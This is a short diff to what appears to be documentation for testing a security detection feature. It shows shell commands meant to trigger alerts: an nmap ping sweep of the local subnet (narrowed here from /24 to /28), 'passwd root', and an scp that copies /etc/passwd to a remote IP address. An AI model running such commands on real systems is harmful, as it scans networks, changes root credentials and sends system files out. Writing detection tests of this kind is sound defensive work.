@@ -62,7 +62,7 @@ To test this feature, we can download a file containing the hash of malware and 
    
    ```bash
    apk add nmap
-   nmap -sn $(hostname -i)/24
+   nmap -sn $(hostname -i)/28
    passwd root
    scp -o ConnectTimeout=3 /etc/passwd goomba@198.13.47.158:/tmp/
    ```
